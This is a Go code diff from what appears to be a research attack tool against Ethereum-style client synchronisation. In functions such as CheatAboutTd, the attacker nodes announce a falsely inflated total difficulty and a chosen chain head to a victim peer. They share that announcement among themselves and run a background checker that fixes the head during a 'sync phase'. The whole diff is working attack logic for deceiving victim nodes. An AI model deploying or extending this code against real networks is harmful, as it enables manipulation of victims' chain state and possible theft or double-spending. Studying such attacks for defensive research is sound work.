@@ -45,8 +45,11 @@ var avoidVictim bool			// Despite we need to only avoid connecting to the victim
 var lastOracleBit bool
 var terminatingStateSync bool
 var announcedSyncTD *big.Int
+var announcedSyncHead common.Hash
 var skeletonStart uint64
 var fixedHead uint64
+var pivot uint64
+var rootAtPivot common.Hash
 
 
 
@@ -511,11 +514,29 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash,
 
 		if (attackPhase == utils.PredictionPhase && lastOracleBit) ||
 		   (attackPhase == utils.SyncPhase && !terminatingStateSync) {
-				td := new(big.Int).Add(getTd(utils.TrueChain), utils.DifficultySupplement)
-				log("True TD in database (+suppl.):", td)
-				head := latest(utils.TrueChain).Hash()
-				announcedSyncTD = td
-				return td, mustCheatAboutTd, &head, nil
+		   		if announcedSyncTD == nil {
+					td := new(big.Int).Add(getTd(utils.TrueChain), utils.DifficultySupplement)
+					log("True TD in database (+suppl.):", td)
+					var head common.Hash
+					if fixedHead == 0 {
+						head = latest(utils.TrueChain).Hash()
+					} else {
+						head = getHeaderByNumber(utils.TrueChain, fixedHead).Hash()
+					}
+					announcedSyncHead = head
+					announcedSyncTD = td
+					content := make([]byte, 0)
+					content = append(content, announcedSyncHead.Bytes()...)
+					content = append(content, announcedSyncTD.Bytes()...)
+					err := sendMessage(msg.AnnouncedSyncTd.SetContent(content))
+					if err != nil {
+						fatal(err, "Could not notify announcedSyncTd")
+					}
+					return td, mustCheatAboutTd, &head, nil
+				} else {
+					td := new(big.Int).Sub(announcedSyncTD, bigOne)
+					return td, mustCheatAboutTd, &announcedSyncHead, nil
+				}
 		}
 
 		if (attackPhase==utils.SyncPhase && terminatingStateSync) || attackPhase == utils.DeliveryPhase {
@@ -714,26 +735,59 @@ func SetSkeletonStart(start uint64) {
 	skeletonStart = start
 }
 
-func StopMoving() bool {
-	headNumber := latest(utils.TrueChain).Number.Uint64()
 
+func stopMovingChecker() {
+	for {
+		time.Sleep(1*time.Second)
+
+		if attackPhase != utils.SyncPhase {
+			continue
+		}
+
+		headNumber := latest(utils.TrueChain).Number.Uint64()
+
+		// Should work with ... >= 88 as well, but doesn't make a big difference
+		if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 {
+			if fixedHead == 0 {
+				fixedHead = headNumber
+				log("Fixed head for sync phase,", "number =", fixedHead)
+			}
+			return
+		}
+	}
+}
+
+func StopMoving() bool {
+	log("Call to StopMoving()...")
 	if attackPhase != utils.SyncPhase {
 		return false
 	}
 
-	// Should work with ... >= 88 as well, but doesn't make a big difference
-	if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 {
-		if fixedHead == 0 {
-			fixedHead = headNumber
-			log("Fixed head for sync phase,", "number =", fixedHead)
-		}
+	if fixedHead > 0 {
+		log("... returned true")
 		return true
 	}
+
+	headNumber := latest(utils.TrueChain).Number.Uint64()
+	log("... returned false, td =", getTd(utils.TrueChain), ", want =", announcedSyncTD, ", L =", (headNumber - skeletonStart)%utils.BatchSize)
 	return false
 }
 
 func FixedHead() uint64 {
 	return fixedHead
+}
+
+func SetPivot(pivotNumber uint64) {
+	pivot = pivotNumber
+	chainType := attackPhase.ToChainType()
+	if chainType == utils.InvalidChainType {
+		log("Not setting any pivot because we are in", attackPhase, "phase")
+	}
+	rootAtPivot = getHeaderByNumber(chainType, pivot).Root
+}
+
+func RootAtPivot() common.Hash {
+	return rootAtPivot
 }
 
 
@@ -814,6 +868,7 @@ func handleMessages() {
 				if attackPhase == utils.PredictionPhase && lastOracleBit {
 					attackPhase = utils.SyncPhase
 					log("Switched to", attackPhase, "phase")
+					go stopMovingChecker()
 				}
 				avoidVictim = false
 				victimLock.Unlock()
@@ -855,6 +910,9 @@ func handleMessages() {
 					log("Switched to", attackPhase, "phase")
 					mustChangeAttackChain = true
 				}()
+			case msg.AnnouncedSyncTd.Code:
+				announcedSyncHead = common.BytesToHash(message.Content[:common.HashLength])
+				announcedSyncTD = new(big.Int).SetBytes(message.Content[common.HashLength:])
 			/*
 			case msg.MustDisconnectVictim.Code:
 				switch message.Content[0] {
